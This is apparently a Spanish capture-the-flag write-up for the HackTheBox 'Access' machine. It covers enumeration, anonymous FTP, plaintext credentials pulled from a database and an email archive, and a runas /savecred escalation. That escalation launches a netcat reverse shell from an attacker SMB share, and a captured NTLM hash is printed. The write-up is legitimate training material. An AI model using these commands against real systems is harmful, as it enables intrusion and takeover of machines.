Write Up de la maquina Access De la plataforma de HackTheBox, Una maquina de dificultad facil.

![](/assets/img/access/machine.png)

## Enumeracion 

Empezemos Detectando que puertos estan abiertos en la maquina victima.
```bash
❯ nmap 10.10.10.98
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 07:13 -05
Nmap scan report for 10.10.10.98
Host is up (0.096s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.44 second
```
Intentemos Detectar la version que corren en estos puertos.

```bash
❯ nmap -sCV -p21,23,80 10.10.10.98 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 07:14 -05
Nmap scan report for 10.10.10.98
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: 4m09s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
```
La maquina victima tiene 3 puertos abiertos ftp, telnet y un servidor web.

nmap nos reporta que el accesso atraves del usuario anonymous esta permitido, conectemosnos al ftp para ver que archivos hay.

```bash
❯ ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:blank): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> 
```
Hay dos directorios veamos lo que hay en backups, hay un solo archivo backup.mdb
```bash
ftp> cd backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> 
```
Para descargar este este archivo correctamente y que no se corrompa al momento de descargar el archivo nos ponemos en modo binary y lo descargamos.
```bash
ftp> binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 7.77 secs (710.6049 kB/s)
ftp> 
```
Veamos lo que hay en el otro directorio Engineer, hay un archivo comprimido, Descarguemos tambien este archivo.
```bash
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
10870 bytes received in 0.29 secs (36.4783 kB/s)
ftp> 
```
El archivo backup.mdb si vemos que clase de archivo es usando file nos reporta que es un archivo de base de datos de Microsoft Access
```bash
❯ file backup.mdb
backup.mdb: Microsoft Access Database
```
Para enumerar esta clase de archivos vamos a utilizar las herramientas que trae la suite mdbtools.

Si listamos las tablas que hay en este archivo nos reportan las siguientes tablas.
```bash
❯ mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx 
```
Cada tabla esta separada por un espacio, para exportar el contenido de cada tabla podemos usar mdb-export pobremos con una tabla para ver si podemos ver el contenido correctamente.
```bash
❯ mdb-export backup.mdb acc_antiback
id,change_operator,change_time,create_operator,create_time,delete_operator,delete_time,status,device_id,one_mode,two_mode,three_mode,four_mode,five_mode,six_mode,seven_mode,eight_mode,nine_mode,AntibackType
```
Podemos ver muy bien el contenido de las tablas como son muchas tablas he ir una a una tomaria mucho tiempo, voy a iterar sobre cada tabla e ir listando el contenido de cada una, voy a filtrar por password y ver dos lineas debajo de el.
```bash

❯ for table in $(mdb-tables backup.mdb);do echo -e "\n[+] tabla $table\n"; mdb-export backup.mdb "$table" ;done |grep 'password' -A 2
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
```
Y vemos una contraseña access4u@security en texto claro, sigamos enumerando.

Antes nos decargamos dos archivos el backup.mdb y un comprimido veamos que hay en el comprimido, usando unzip con el parametro -l de listen.

```bash
❯ unzip -l Access\ Control.zip
Archive:  Access Control.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   271360  2018-08-24 01:13   Access Control.pst
---------                     -------
   271360                     1 file
```
Si Intentamos descomprimir el archivo usando unzip nos da un error.
```bash
❯ unzip Access\ Control.zip
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```
Podemos usar 7z para descomprimir este archivo, al momento de intentar descomprimirlo nos va a pedir una contraseña.
```bash
❯ 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_CO.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
```
Antes en el backup.mdb obtuvimos una contraseña probemos aver si funciona.
```bash
❯ 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_CO.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):access4u@security
Everything is Ok         

Size:       271360
Compressed: 10870
```
Y funciono, Este comprimido tenia un archivo .pst veamos que son esta clase de archivos, con file podemos ver a que clase de archivo nos enfrentamos.

```bash
❯ file Access\ Control.pst
Access Control.pst: Microsoft Outlook email folder (>=2003)
```
Que son los archivos .pst?

*Un archivo pst es una carpeta de almacenamiento personal en la que se almacenan copias de sus mensajes, eventos de su calendario y otros elementos de Microsoft Outlook*

Teniendo esto en claro, para poder visualizar el contenido de este archivo podemos utilizar readpst la cual nos crea otro archivo con la informacion en texto claro.
```bash
❯ readpst Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
```
Esto nos crea un archivo .mbox veamos que hay en este archivo, y podemos ver cosas interesantes en este correo en el subject hablan de la cuenta security por lo puede ser un usuario valido a nivel de sistema, y abajo podemos ver su contraseña.
```bash
❯ cat Access\ Control.mbox |head -25
From "john@megacorp.com" Thu Aug 23 18:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-222957189_-_-"


----boundary-LibPST-iamunique-222957189_-_-
Content-Type: multipart/alternative;
	boundary="alt---boundary-LibPST-iamunique-222957189_-_-"

--alt---boundary-LibPST-iamunique-222957189_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```
## Intrusion
Podemos usar estas credenciales para conectarnos por telnet.
```bash
❯ telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security

C:\Users\security>
```
## Escalada de privilegios

Si enumeramos las credenciales que han sido almacenadas en el cache de la maquina podemos ver que el usuario administrator tiene su contraseña en el cache por lo que podemos aprovecharnos de esta para poder ejecuar comandos y escalar privelegios.
```bash
C:\Users\security>cmdkey /list   

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    

C:\Users\security>
```

En windows viene una herramienta llamada runas atraves de la cual podemos ejecutar comandos como otro usuario siempre y cuando tengamos la contraseña, en este caso como la credencial estan en el cache podemos utilizar el argumento /savecred este argumento se utiliza para indicar que se deben guardar las credenciales proporcionadas durante una ejecución para su uso en el futuro, cuando se ejecuta el comando runas nuevamente en el futuro, el sistema operativo buscará automáticamente las credenciales guardadas en el caché de credenciales, por lo que no es necesario volver a indicarle cual es la contraseña del usuario.

Para ganar accesso a la maquina voy a usar nc.exe, voy a utilizar el que viene con el repositorio de seclists.
```bash
❯ cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
```
Voy a montar un recurso compartido a nivel de red usando smbserver.py
```bash
❯ smbserver.py smb $(pwd) -smb2support
```
Y me voy a poner en escuha por el puerto 443, voy a utilizar rlwrap para poder moverme mas comodo en la consola.
```bash
❯ rlwrap nc -lvnp 443
```
Este es el comando que voy a utilizar, los dos primeros argumentos son la autenticacion y el utilmo argumento es el comando o programar que quiero ejecutar, con este comando le estoy indicando que se conecte a mi recurso compartido a nivel de red y me ejecute el nc.exe con los siguiente argumentos con el -e le indico que quiero enviar una cmd a la ip 10.10.14.8 y el puerto 443.
```bash
runas /savecred /user:ACCESS\Administrator "cmd /c \\10.10.14.8\smb\nc.exe -e cmd 10.10.14.8 443"
```
Lo ejcutamos
```bash
C:\>runas /savecred /user:ACCESS\Administrator "cmd /c \\10.10.14.8\smb\nc.exe -e cmd 10.10.14.8 443"
```
Nos llega la conexion al recurso compartido.
```bash
❯ smbserver.py smb $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.98,49191)
[*] AUTHENTICATE_MESSAGE (ACCESS\Administrator,ACCESS)
[*] User ACCESS\Administrator authenticated successfully
[*] Administrator::ACCESS:aaaaaaaaaaaaaaaa:11ba3a0598e2d4930add9f1b5c4f415a:0101000000000000001443a4c388d90127ecfb86a2fdd0f2000000000100100056006e007700650055004f0054004800020010004f0073005500690047006800520079000300100056006e007700650055004f0054004800040010004f00730055006900470068005200790007000800001443a4c388d90106000400020000000800300030000000000000000000000000300000c203ef37bf36cef78c4fa4a9a30c8bfc68948974626acf9a1248fe95157cbc440a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003800000000000000000000000000
[*] Connecting Share(1:smb)
[*] Incoming connection (10.10.10.98,49192)
[*] AUTHENTICATE_MESSAGE (\,ACCESS)
[*] User ACCESS\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:smb)
[-] Unknown level for query path info! 0xf
```
Por debajo nos llega la consola.
```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.98] 49193
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
access\administrator

C:\Windows\system32>
```
Gracias por leer!